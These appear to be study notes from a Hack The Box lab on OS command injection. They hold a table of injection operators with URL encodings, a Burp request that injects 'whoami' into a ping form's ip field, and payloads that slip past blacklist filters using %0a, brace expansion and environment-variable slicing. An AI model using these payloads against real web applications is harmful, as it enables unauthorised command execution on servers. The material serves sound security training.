
| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both **(Linux-only)**                      |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both **(Linux-only)**                      |
# Using Burp
```bash
POST / HTTP/1.1
Host: 154.57.164.82:30344
Content-Length: 3
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://154.57.164.82:30344
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.82:30344/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

ip=127.0.0.1; whoami
# Use ctrl + u

# The output
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.050/0.050/0.050/0.000 ms
www-data
```

```bash
ip=127.0.0.1; whoami
ip=127.0.0.1 | whoami
```

# Bypassing Blacklisted Operators
```bash
ip=127.0.0.1
ip=127.0.0.1%0a{ls,-la}
```
### Linux
```bash
[/htb]$ echo ${PATH} 
/usr/local/bin:/usr/bin:/bin:/usr/games

[/htb]$ echo ${PATH:0:1}
/

[/htb]$ echo ${LS_COLORS:10:1} 
;

127.0.0.1%0a{ls,-la,${IFS},${PATH:0:1}home}
```